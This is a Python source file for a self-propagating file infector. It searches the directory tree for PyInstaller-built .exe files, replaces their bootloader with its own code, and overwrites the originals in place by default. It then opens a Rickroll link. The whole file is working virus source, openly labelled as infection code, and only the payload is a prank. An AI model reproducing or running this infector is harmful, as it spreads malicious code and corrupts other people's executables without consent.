from __future__ import print_function

import os
import sys
import struct

MAGIC = b'MEI\014\013\012\013\016'

MAGIC_OVERLAY = b"\x00\x00\x00\x00\x00\x00\x00\x00\x78\xda"

# testing purposes - you can either rewrite file or create new
DO_NOT_REWRITE_EXISTED_FILES = False
suffix = ".infected.exe"

MY_EXECUTABLE = b""


def detect_pyinstaller(path):
    with open(path, "rb") as f:
        r = f.read()
        if MAGIC in r:
            if b"import base64;exec(base64.b64decode('" not in r:
                return True
    return False


def find_pyinstallers(basepath="."):
    ans = []
    for base, _, files in os.walk(basepath):
        for file in files:
            if file == sys.argv[0]:
                continue
            if file.endswith(".exe"):
                file_fullpath = os.path.join(base, file)
                if detect_pyinstaller(file_fullpath):
                    ans.append(file_fullpath)
    return ans


def find_myself():
    global MY_EXECUTABLE, MAGIC_OVERLAY
    my_content = open(sys.argv[0], "rb").read()
    f = my_content.find(MAGIC_OVERLAY)
    if f != -1:
        MY_EXECUTABLE = my_content[:f + 8]
    else:
        MY_EXECUTABLE = my_content  # probably .pkg games


def inject_myself(path):
    print("Path:", path)
    global MY_EXECUTABLE, MAGIC_OVERLAY
    his_content = bytearray(open(path, "rb").read())
    offset = his_content.find(MAGIC_OVERLAY)

    if offset == -1:
        print("Found no magic")
        return False

    try:
        with open(path + ".infected.exe" if DO_NOT_REWRITE_EXISTED_FILES else path, "wb") as f:
            f.write(MY_EXECUTABLE + his_content[offset + 8:])
        print("> Infected", path)
    except:
        print("> Failed to infect", path, "- probably this file in run right now")


def main():
    global MY_EXECUTABLE
    # Step 1 - find our targets
    pyis = find_pyinstallers()
    print("> We will infect these executables: ", pyis)
    # Step 2 - find our loader
    find_myself()
    if not MY_EXECUTABLE:
        print("> I did not find myself")
        return 1
    for path in pyis:
        #  Step 3 - replace loaders
        inject_myself(path)
    # Step 4 - run Rick Ashley
    os.system("start \"\" https://www.youtube.com/watch?v=dQw4w9WgXcQ")


if __name__ == "__main__":
    main()